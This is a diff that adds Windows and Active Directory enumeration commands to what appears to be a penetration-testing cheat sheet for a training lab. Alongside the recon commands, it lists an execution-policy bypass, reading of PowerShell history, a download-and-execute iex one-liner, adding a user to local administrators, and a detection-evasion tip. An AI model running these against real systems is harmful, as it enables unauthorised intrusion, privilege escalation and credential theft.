@@ -1255,11 +1255,25 @@ Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
 
 ##### Living Of The Land
 ```
+# Basic Enumeration Commands
+hostname
+[System.Environment]::OSVersion.Version
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+ipconfig /all
+set
+echo %USERDOMAIN%
+echo %logonserver%
+
 # PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host
 Get-Module
-
-# Loads the Active Directory PowerShell module from a Windows-based host.
 Import-Module ActiveDirectory
+
+Get-ExecutionPolicy -List
+Set-ExecutionPolicy Bypass -Scope Process
+Get-ChildItem Env: | ft Key,Value
+Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"
+Get-host
 
 # PowerShell cmd-let used to gather Windows domain information from a Windows-based host.
 Get-ADDomain
@@ -1272,6 +1286,68 @@ Get-ADTrust -Filter * | select name
 
 # PowerShell cmd-let used to discover the members of a specific group (-Identity "Backup Operators"). Performed from a Windows-based host.
 Get-ADGroupMember -Identity "Backup Operators"
+
+---------------------------
+# Firewall Checks
+netsh advfirewall show allprofiles
+sc query windefend
+Get-MpComputerStatus
+
+# AmIAlone
+qwinsta
+
+# Network Information
+arp -a
+ipconfig /all
+route print
+netsh advfirewall show allprofiles
+
+# Windows Management Instrumentation (WMI)
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
+wmic process list /format:list
+wmic ntdomain list /format:list
+wmic useraccount list /format:list
+wmic group list /format:list
+wmic sysaccount list /format:list
+wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
+https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4
+
+## Net Commands
+net accounts	Information about password requirements
+net accounts /domain	Password and lockout policy
+net group /domain	Information about domain groups
+net group "Domain Admins" /domain	List users with domain admin privileges
+net group "domain computers" /domain	List of PCs connected to the domain
+net group "Domain Controllers" /domain	List PC accounts of domains controllers
+net group <domain_group_name> /domain	User that belongs to the group
+net groups /domain	List of domain groups
+net localgroup	All available groups
+net localgroup administrators /domain	List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)
+net localgroup Administrators	Information about a group (admins)
+net localgroup administrators [username] /add	Add user to administrators
+net share	Check current shares
+net user <ACCOUNT_NAME> /domain	Get information about a user within the domain
+net user /domain	List all users of the domain
+net user %username%	Information about the current user
+net use x: \computer\share	Mount the share locally
+net view	Get a list of computers
+net view /all /domain[:domainname]	Shares on the domains
+net view \computer /ALL	List shares of a computer
+net view /domain	List of PCs of the domain
+((((simple trick try net1 instead of net))))
+
+-----------------------
+## Dsquery
+dsquery user
+dsquery computer
+dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
+dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
+
+
+https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754232(v=ws.11)
+
 ```
 ##### Kerberoasting
 ```
